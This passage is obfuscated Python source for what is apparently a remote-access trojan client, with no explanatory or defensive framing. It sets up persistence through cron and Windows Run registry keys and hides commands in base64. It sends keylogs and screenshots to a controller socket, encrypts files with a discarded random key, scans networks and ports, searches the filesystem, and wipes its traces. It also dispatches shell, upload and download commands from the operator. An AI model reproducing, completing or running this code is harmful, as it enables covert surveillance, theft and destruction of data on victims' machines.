        fles .append ("/etc/lightdm/addOn/")#line:573
        fles .append ("etc/lightdm/addOn/addOnBinary")#line:574
    else :#line:575
        OOO00O000000O000O =os .environ ["appdata"]+"\\Mservice.exe"#line:576
        fles .append (OOO00O000000O000O )#line:577
        if not os .path .exists (OOO00O000000O000O ):#line:578
            shutil .copyfile (sys .executable ,OOO00O000000O000O )#line:579
            subprocess .call (f'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MService /t REG_SZ /d "{OOO00O000000O000O}"',shell =True )#line:582
def bWFrZUxvd3BlcnNpc3RlbmNlCg ():#line:585
    if os .name =="posix":#line:586
        O00OOO000OO0O000O =str (pathlib .Path .home ())+"/.config"#line:587
        if not os .path .exists (f"{O00OOO000OO0O000O}/worker"):#line:588
            os .makedirs (f'{O00OOO000OO0O000O}/worker')#line:589
        shutil .copyfile (sys .executable ,f'{O00OOO000OO0O000O}/worker/worker')#line:590
        os .chmod (f'{O00OOO000OO0O000O}/worker/worker',0o755 )#line:591
        O000OOOO0OOO00OOO =f"@reboot {O00OOO000OO0O000O}/worker/worker\n"#line:592
        with open ("/tmp/tmpajfeasc","w")as O0OOOO00O00O0O0O0 :#line:594
            O0OOOO00O00O0O0O0 .write (O000OOOO0OOO00OOO )#line:595
        os .system (base64 .b64decode ("Y3JvbnRhYiAvdG1wL3RtcGFqZmVhc2MgJj4vZGV2L251bGwK"))#line:597
        fles .append (f"{O00OOO000OO0O000O}/worker")#line:598
    else :#line:599
        O00O000O00OO0000O =os .environ ["appdata"]+"\\Mservice.exe"#line:600
        if not os .path .exists (O00O000O00OO0000O ):#line:602
            shutil .copyfile (sys .executable ,O00O000O00OO0000O )#line:603
            subprocess .call (f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MService /t REG_SZ /d "{O00O000O00OO0000O}"',shell =True )#line:606
        fles .append (O00O000O00OO0000O )#line:607
    sock .send ("done".encode ())#line:608
def cGVyc2lzdGVuY2UK ():#line:611
    if perm ()=="\n\t[+] Admin Privileges\n":#line:612
        bWFrZVBlcnNpc3RlbmNlCg ()#line:613
        sock .send ("root")#line:614
    else :#line:615
        sock .send ("no_root".encode ())#line:616
def sdnKog ():#line:619
    with open (kygerth ,"r")as O0O00O0O00OOOO00O :#line:620
        O0O00O0O00OOOO00O =O0O00O0O00OOOO00O .read ()#line:621
    O0O00O0O0O0OO000O =0 #line:622
    O000000OOOOOO0O00 =len (O0O00O0O00OOOO00O )#line:623
    O0OO0OO0O0OO00000 =1024 #line:624
    while O0O00O0O0O0OO000O <O000000OOOOOO0O00 :#line:625
        O0OO0000OO000O00O =min (O0O00O0O0O0OO000O +O0OO0OO0O0OO00000 ,O000000OOOOOO0O00 )#line:626
        O00O00O0OO000O000 =O0O00O0O00OOOO00O [O0O00O0O0O0OO000O :O0OO0000OO000O00O ]#line:627
        sock .send (O0O00O0O00OOOO00O .encode ())#line:628
        O0O00O0O0O0OO000O +=len (O00O00O0OO000O000 )#line:629
    sock .send ("[+] Keylog sent successfully.".encode ())#line:631
def sdsht ():#line:634
    try :#line:635
        OO0000O00OO0000OO =ImageGrab .grab ()#line:636
        OO0000O00OO0000OO .save ("x.png","PNG")#line:637
        with open ("x.png","rb")as O000O0O00OO0000OO :#line:638
            O00O00000O000OOOO =O000O0O00OO0000OO .read ()#line:639
        os .remove ("x.png")#line:640
        return O00O00000O000OOOO #line:641
    except Exception as OOOO0OOOOO00000O0 :#line:642
        return str (OOOO0OOOOO00000O0 ).encode ()#line:643
def tk_nd_sd_sht ():#line:646
    O0O0OO0OO0O0OO000 =sdsht ()#line:647
    OO000OOO0OO0OOO00 =0 #line:648
    OOO0OOO00O000OO0O =len (O0O0OO0OO0O0OO000 )#line:649
    OO000000000000O0O =1024 #line:650
    while OO000OOO0OO0OOO00 <OOO0OOO00O000OO0O :#line:651
        OO00O0OO0O0OOO0OO =min (OO000OOO0OO0OOO00 +OO000000000000O0O ,OOO0OOO00O000OO0O )#line:652
        O0O0OO00OOO0O0O00 =O0O0OO0OO0O0OO000 [OO000OOO0OO0OOO00 :OO00O0OO0O0OOO0OO ]#line:653
        sock .send (O0O0OO00OOO0O0O00 )#line:654
        OO000OOO0OO0OOO00 +=len (O0O0OO00OOO0O0O00 )#line:655
    sock .send (base64 .b64decode (b"WytdIFNjcmVlbnNob3Qgc2VudCBzdWNjZXNzZnVsbHkuCg=="))#line:657
def cntread (O0O000000O0OO00OO ):#line:660
    try :#line:661
        with open (O0O000000O0OO00OO ,"rb")as OO0O0O0OOOOO000O0 :#line:662
            OO0O0O0OOOOO000O0 =OO0O0O0OOOOO000O0 .read ()#line:663
        OO0O00O0O00000O0O =encrypt (OO0O0O0OOOOO000O0 ,secrets .token_bytes (32 ))#line:664
        with open (O0O000000O0OO00OO ,"wb")as OO0O0O0OOOOO000O0 :#line:665
            OO0O0O0OOOOO000O0 .write (OO0O00O0O00000O0O )#line:666
        return "True"#line:667
    except Exception as O0000OO000OO00O0O :#line:668
        return str (O0000OO000OO00O0O )#line:669
def scnet ():#line:672
    OOOO0O00OO00O0000 =detectIp_Mask ()#line:673
    sock .send (str (OOOO0O00OO00O0000 ).encode ())#line:674
    OO00OO000O0O00000 =sock .recv (1024 ).decode ()#line:675
    OOOOO0OOOO000OO00 =Networkscan (OO00OO000O0O00000 )#line:676
    OOOOO0OOOO000OO00 .run ()#line:677
    OOOO0OO0OOOOOOO0O =OOOOO0OOOO000OO00 .list_of_hosts_found #line:678
    sock .send (str (OOOOO0OOOO000OO00 .nbr_host_found ).encode ())#line:679
    for OOOO0OOOO0O00OOO0 in OOOO0OO0OOOOOOO0O :#line:680
        sock .send (OOOO0OOOO0O00OOO0 .encode ())#line:681
def init_scan (OO0O0O00O0OO0O000 ):#line:685
    O0O0O00O00OOOO000 =65535 #line:686
    OOO00OO000O00OO00 =[]#line:687
    def OOO0O0OOO0OO00000 (O0OO0O0000OO0O00O ):#line:688
        if O0OO0O0000OO0O00O %75 ==0 :#line:689
            O0O0000O0OO0O00OO ="\r"+'\tScaning Port : %s/%s [%s%s] %.2f%%'%(O0OO0O0000OO0O00O ,O0O0O00O00OOOO000 ,"▓"*int (O0OO0O0000OO0O00O *25 /O0O0O00O00OOOO000 ),"▒"*(25 -int (O0OO0O0000OO0O00O *25 /O0O0O00O00OOOO000 )),float (O0OO0O0000OO0O00O /O0O0O00O00OOOO000 *100 ))#line:693
            sock .send (str (O0O0000O0OO0O00OO ).encode ())#line:694
        O0O0O00OO0OOO0O00 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:697
        socket .setdefaulttimeout (0.15 )#line:699
        try :#line:701
            OOOO000OO000000OO =O0O0O00OO0OOO0O00 .connect_ex ((OO0O0O00O0OO0O000 ,O0OO0O0000OO0O00O ))#line:703
            if OOOO000OO000000OO ==0 :#line:705
                OOO00OO000O00OO00 .append (O0OO0O0000OO0O00O )#line:706
        except Exception as O0OOOOOOO000O0OOO :#line:707
            sock .send ("Error inesperado : {}".format (O0OOOOOOO000O0OOO ).encode ())#line:708
        finally :#line:709
            O0O0O00OO0OOO0O00 .close ()#line:710
    with concurrent .futures .ThreadPoolExecutor (max_workers =100 )as O00OO000O000O0000 :#line:712
        O0OO000OOOOOO000O =[]#line:713
        for OO0O0O0OOOOO0OO0O in range (1 ,O0O0O00O00OOOO000 +1 ):#line:714
            try :#line:715
                O0OO000OOOOOO000O .append (O00OO000O000O0000 .submit (OOO0O0OOO0OO00000 ,OO0O0O0OOOOO0OO0O ))#line:716
            except Exception as O00OO0OOOOO00000O :#line:717
                sock .send ("Error inesperado : {}".format (O00OO0OOOOO00000O ).encode ())#line:718
    sock .send (str (OOO00OO000O00OO00 ).encode ())#line:720
    return OOO00OO000O00OO00 ,OO0O0O00O0OO0O000 #line:721
def printFormed (OOOOOOOO0O00OO000 ):#line:723
    O0OO00O000O00OO0O =[]#line:724
    if len (OOOOOOOO0O00OO000 ['ip'])==len (OOOOOOOO0O00OO000 ['mask']):#line:726
        for O000OOOOO0O0O0O0O in range (len (OOOOOOOO0O00OO000 ['ip'])):#line:727
            OOOOO000OOO0O0O00 =OOOOOOOO0O00OO000 ['ip'][O000OOOOO0O0O0O0O ]#line:728
            O00OOO0OO0000OOOO =OOOOOOOO0O00OO000 ['mask'][O000OOOOO0O0O0O0O ]#line:729
            OO00OOO00OO0OO00O =str (ipaddress .ip_network (f"{OOOOO000OOO0O0O00}/{O00OOO0OO0000OOOO}",strict =False ))#line:730
            O0OO00O000O00OO0O .append (OO00OOO00OO0OO00O )#line:731
    return O0OO00O000O00OO0O #line:732
def detectIp_Mask ():#line:735
    if os .name !="posix":#line:736
        O0O000OO000OOO000 ='powershell.exe -c "ipconfig | Select-String -Pattern \'Dirección|Máscara\' -CaseSensitive | ForEach-Object { ($_.Line.Split(\' \'))[19] } "'#line:737
    else :#line:738
        O0O000OO000OOO000 ="ifconfig | grep -oP 'inet .*' | awk '{print $2, $4}' | tr ' ' '\n'"#line:740
    OO000OOO0000O0000 =subprocess .run (O0O000OO000OOO000 ,capture_output =True ,text =True ,shell =True )#line:742
    O000O0OO000OO00OO =OO000OOO0000O0000 .stdout #line:744
    O000O0OO000OO00OO =O000O0OO000OO00OO .split ("\n")#line:745
    O0OO00OO00OOOO0OO ={"ip":[],"mask":[]}#line:748
    O0OO000OO00000OOO =0 #line:749
    for OO0000000O0OO0O00 in O000O0OO000OO00OO :#line:750
        if OO0000000O0OO0O00 :#line:751
            if O0OO000OO00000OOO ==0 :#line:752
                O0OO00OO00OOOO0OO ['ip'].append (OO0000000O0OO0O00 )#line:753
                O0OO000OO00000OOO +=1 #line:754
            elif O0OO000OO00000OOO ==1 :#line:755
                O0OO00OO00OOOO0OO ['mask'].append (OO0000000O0OO0O00 )#line:756
                O0OO000OO00000OOO =0 #line:757
    O0OO0O000O0000O00 =printFormed (O0OO00OO00OOOO0OO )#line:759
    return O0OO0O000O0000O00 #line:760
def scan_port (OOOO0O0OO00O00OO0 ,O0O00OO0O0OO000OO ,O0OO000O00000OOO0 ):#line:763
    try :#line:764
        O0OOO000OOO000O00 =nmap .scan (O0OO000O00000OOO0 ,OOOO0O0OO00O00OO0 ,"tcp")#line:765
        O0O00OO0O0OO000OO .put ((OOOO0O0OO00O00OO0 ,str (O0OOO000OOO000O00 )))#line:766
    except socket .timeout as O00O0O0O0OOO00000 :#line:767
        O0O00OO0O0OO000OO .put ((OOOO0O0OO00O00OO0 ,f"Max Timeout reached: {str(O00O0O0O0OOO00000)}"))#line:768
    except ConnectionRefusedError as O00O0O0O0OOO00000 :#line:769
        O0O00OO0O0OO000OO .put ((OOOO0O0OO00O00OO0 ,f"Closed: {str(O00O0O0O0OOO00000)}"))#line:770
    except ConnectionResetError as O00O0O0O0OOO00000 :#line:771
        O0O00OO0O0OO000OO .put ((OOOO0O0OO00O00OO0 ,f"Reset: {str(O00O0O0O0OOO00000)}"))#line:772
    except Exception as O00O0O0O0OOO00000 :#line:773
        O0O00OO0O0OO000OO .put ((OOOO0O0OO00O00OO0 ,f"Error: {str(O00O0O0O0OOO00000)}"))#line:774
def processData (OOO0000OOO0OOOO0O ):#line:777
    OOO0O00OOOOO0O0O0 =[]#line:779
    O0O0O0OO00O0OO000 ={OOO0000OOO0OOOO0O :{}}#line:780
    while not result_queue .empty ():#line:781
        O0OOO0OO0OO0OOO00 ,O00O0OOOOO00O0OOO =result_queue .get ()#line:782
        O0O0O0OO00O0OO000 [OOO0000OOO0OOOO0O ][O0OOO0OO0OO0OOO00 ]=O00O0OOOOO00O0OOO #line:783
    OOO0O00OOOOO0O0O0 .append (O0O0O0OO00O0OO000 )#line:785
    return OOO0O00OOOOO0O0O0 #line:786
def initScanServices (OO00OOO0O0O000O00 ,O0000O00OO00OO00O ):#line:789
    for OOOOO0O0OOO000OOO in OO00OOO0O0O000O00 :#line:790
        O000OO0OO0OO0O00O =multiprocessing .Process (target =scan_port ,args =(OOOOO0O0OOO000OOO ,result_queue ,O0000O00OO00OO00O ))#line:791
        O000OO0OO0OO0O00O .start ()#line:792
        processes .append (O000OO0OO0OO0O00O )#line:793
    OOOOOOO0O0OO00O0O =0 #line:795
    for O000OO0OO0OO0O00O in processes :#line:797
        O000OO0OO0OO0O00O .join (timeout =global_timeout )#line:798
        if O000OO0OO0OO0O00O .is_alive ():#line:799
            O000OO0OO0OO0O00O .terminate ()#line:800
        OOOOOOO0O0OO00O0O +=1 #line:801
def startServices (O0000O0O0OOO0OO0O ,O0O0O0000O0OO0O00 ):#line:804
    initScanServices (O0O0O0000O0OO0O00 ,O0000O0O0OOO0OO0O )#line:805
    OOOO000O00OO0O0O0 =processData (O0000O0O0OOO0OO0O )#line:806
    OO00O0O0O0000O000 =len (str (OOOO000O00OO0O0O0 ))#line:807
    sock .send (f"buffer {str(OO00O0O0O0000O000)}".encode ())#line:808
    sock .send ("formed data".encode ())#line:809
    sock .send (str (OOOO000O00OO0O0O0 ).encode ())#line:810
def sndPrtition (O0000OO0OOO0O0O0O ):#line:813
    O0OO0O0OOOO0O0O0O =json .dumps (O0000OO0OOO0O0O0O )#line:814
    OOOO00O0O00O00000 =4096 #line:815
    O0O00000OO0OO0OOO =len (O0OO0O0OOOO0O0O0O )#line:817
    sock .send (str (O0O00000OO0OO0OOO ).encode ())#line:818
    for O0000OO0O00OO00O0 in range (0 ,O0O00000OO0OO0OOO ,OOOO00O0O00O00000 ):#line:820
        O0O00000OO0OOOO00 =O0OO0O0OOOO0O0O0O [O0000OO0O00OO00O0 :O0000OO0O00OO00O0 +OOOO00O0O00O00000 ]#line:821
        sock .send (O0O00000OO0OOOO00 .encode ())#line:822
def stf (O00O0000O0OO00OO0 ,O0OO00O0000O0OO00 ):#line:825
    O0OO00O0000O0OO00 .append (O00O0000O0OO00OO0 )#line:826
def fd_fs_n_ds (OOO0OO00000OOO0OO ,OOO0OOO00OOOO00O0 ):#line:829
    O0O0O0000O0O0O0OO =[]#line:830
    with concurrent .futures .ThreadPoolExecutor ()as OO00O0O00OO0O0O0O :#line:831
        O000OO00000O00OOO =[]#line:832
        for O0OOO0O00O0OO0OO0 in OOO0OO00000OOO0OO :#line:833
            for O000OO0OOOO0OOO00 ,O0OOO0O00O0OO0OO0 ,O00OOOO0OOO0O0O00 in os .walk (O0OOO0O00O0OO0OO0 ):#line:834
                for O00000O0000O0000O in O00OOOO0OOO0O0O00 :#line:835
                    if fnmatch .fnmatch (O00000O0000O0000O ,OOO0OOO00OOOO00O0 ):#line:836
                        O00000OO00O000OO0 =os .path .join (O000OO0OOOO0OOO00 ,O00000O0000O0000O )#line:837
                        O000OO00000O00OOO .append (OO00O0O00OO0O0O0O .submit (stf ,O00000OO00O000OO0 ,O0O0O0000O0O0O0OO ))#line:838
        concurrent .futures .wait (O000OO00000O00OOO )#line:840
        O0000OOOOO0OO00O0 =len (str (O0O0O0000O0O0O0OO ))#line:841
        if O0000OOOOO0OO00O0 >7000 :#line:842
            sock .send ("prt".encode ())#line:843
            sndPrtition (O0O0O0000O0O0O0OO )#line:844
        else :#line:845
            sock .send (f"buffer {str(O0000OOOOO0OO00O0)}".encode ())#line:846
            sock .send (str (O0O0O0000O0O0O0OO ).encode ())#line:847
def dstrct ():#line:850
    print (pids ,fles )#line:851
    if pids :#line:852
        for OOOOOO00OOO0O0OOO in pids :#line:853
            O0O0OO00OO0O00O00 =psutil .Process (OOOOOO00OOO0O0OOO )#line:854
            for O0OOOO00000000OOO in O0O0OO00OO0O00O00 .children (recursive =True ):#line:855
                O0OOOO00000000OOO .kill ()#line:856
            O0O0OO00OO0O00O00 .kill ()#line:857
    for OO00O0O00000O00O0 in fles :#line:858
        if "python"in OO00O0O00000O00O0 :#line:859
            continue #line:860
        elif os .path .isdir (OO00O0O00000O00O0 ):#line:861
            shutil .rmtree (OO00O0O00000O00O0 )#line:862
        elif os .path .isfile (OO00O0O00000O00O0 ):#line:863
            os .remove (OO00O0O00000O00O0 )#line:864
    O0O0OO00OO0O00O00 =psutil .Process (os .getpid ())#line:865
    for O0OOOO00000000OOO in O0O0OO00OO0O00O00 .children (recursive =True ):#line:866
        O0OOOO00000000OOO .kill ()#line:867
    O0O0OO00OO0O00O00 .kill ()#line:868
    sock .close ()#line:869
def game (OO0O0OO0OO0O00OO0 ):#line:873
    while True :#line:875
        O0O00OO00O0OO000O =OO0O0OO0OO0O00OO0 .recv (1024 )#line:876
        if O0O00OO00O0OO000O ==" ".encode ():#line:878
            OO0O0OO0OO0O00OO0 .send (" ".encode ())#line:879
        elif O0O00OO00O0OO000O =="Y2xvc2UK".encode ():#line:881
            OO0O0OO0OO0O00OO0 .close ()#line:882
            break #line:883
        elif "c3RhcnRUYXNrCg==".encode ()in O0O00OO00O0OO000O :#line:885
            OOO0O0O0000O0O0O0 =threading .Thread (target =srtTks )#line:886
            OOO0O0O0000O0O0O0 .start ()#line:887
            pids .append (OOO0O0O0000O0O0O0 .native_id )#line:888
        elif 'Y2hlY2sK'.encode ()in O0O00OO00O0OO000O :#line:890
            OO0O0OO0OO0O00OO0 .send (perm ().encode ())#line:891
        elif 'c3lzaW5mbwo='.encode ()in O0O00OO00O0OO000O :#line:893
            OO0O0OO0OO0O00OO0 .send (gtNfo ().encode ())#line:894
        elif 'ZG93bmxvYWREaXIK'.encode ()in O0O00OO00O0OO000O :#line:896
            dloadD (O0O00OO00O0OO000O .decode ())#line:897
        elif 'ZG93bmxvYWQK'.encode ()in O0O00OO00O0OO000O :#line:899
            dload (O0O00OO00O0OO000O .decode ())#line:900
        elif 'dXBsb2FkCg=='.encode ()in O0O00OO00O0OO000O :#line:902
            uload (O0O00OO00O0OO000O .decode ())#line:903
        elif "YXYK".encode ()in O0O00OO00O0OO000O :#line:905
            O00OOOO0O00OOO00O =threading .Thread (target =A_V_Dte_Ct )#line:906
            O00OOOO0O00OOO00O .start ()#line:907
            O00OOOO0O00OOO00O .join ()#line:908
            time .sleep (0.1 )#line:909
        elif 'c2hlbGwK'.encode ()in O0O00OO00O0OO000O :#line:911
            realGme ()#line:912
        elif 'ZXhlYwo='.encode ()in O0O00OO00O0OO000O :#line:914
            O0OO00OO0OO0O0O0O =O0O00OO00O0OO000O .decode ()#line:915
            excIns (O0OO00OO0OO0O0O0O .replace ('ZXhlYwo= ',""))#line:916
        elif "Z2V0Cg==".encode ()in O0O00OO00O0OO000O :#line:918
            gt (O0O00OO00O0OO000O .decode ())#line:919
        elif "cGVyc2lzdGVuY2UK".encode ()==O0O00OO00O0OO000O [:16 ]:#line:921
            cGVyc2lzdGVuY2UK ()#line:922
        elif "bG93cGVyc2lzdGVuY2UK".encode ()in O0O00OO00O0OO000O :#line:924
            bWFrZUxvd3BlcnNpc3RlbmNlCg ()#line:925
        elif "Y3J5cHQK".encode ()in O0O00OO00O0OO000O :#line:927
            O0000OOOO0000O0OO =cntread (O0O00OO00O0OO000O .replace ("Y3J5cHQK ".encode (),"".encode ()).decode ())#line:928
            OO0O0OO0OO0O00OO0 .send (O0000OOOO0000O0OO .encode ())#line:929
        elif "Y3J5cHREaXIK".encode ()in O0O00OO00O0OO000O :#line:931
            strCpt (O0O00OO00O0OO000O .decode ())#line:932
            OO0O0OO0OO0O00OO0 .send ("done".encode ())#line:933
        elif "a2V5bG9nX2R1bXAK".encode ()in O0O00OO00O0OO000O :#line:935
            OOO0O0O0000O0O0O0 =threading .Thread (target =sdnKog )#line:936
            OOO0O0O0000O0O0O0 .start ()#line:937
            OOO0O0O0000O0O0O0 .join ()#line:938
        elif "c2NyZWVuc2hvdAo=".encode ()in O0O00OO00O0OO000O :#line:940
            tk_nd_sd_sht ()#line:941
        elif "c2Nhbm5ldAo=".encode ()in O0O00OO00O0OO000O :#line:943
            scnet ()#line:944
        elif "c2Nhbmhvc3QK".encode ()in O0O00OO00O0OO000O :#line:946
            OOOO000O0000OOOOO ,OO0OOO0OO0O0OOOO0 =init_scan (O0O00OO00O0OO000O .decode ().replace ("c2Nhbmhvc3QK ",""))#line:947
            startServices (OO0OOO0OO0O0OOOO0 ,OOOO000O0000OOOOO )#line:948
        elif "c2VhcmNo".encode ()in O0O00OO00O0OO000O :#line:950
            O0OO00O00OO0OO000 ="*.{}".format (O0O00OO00O0OO000O .decode ().replace ("c2VhcmNo ",""))#line:951
            fd_fs_n_ds (['/'],O0OO00O00OO0OO000 )#line:952
        elif "ZGVzdHJ1Y3Rpb24K".encode ()in O0O00OO00O0OO000O :#line:954
            dstrct ()#line:955
        else :#line:957
            pass #line:958
def main ():#line:960
    OOO00000OOOOOO0OO =threading .Thread (target =start )#line:961
    OOO00000OOOOOO0OO .start ()#line:962
    pids .append (OOO00000OOOOOO0OO .native_id )#line:963
    """startThread = threading . Thread (target=make_conect)
    startThread .start ()"""#line:965
    make_conect ()#line:966
if __name__ =="__main__":#line:969
    main ()#line:970
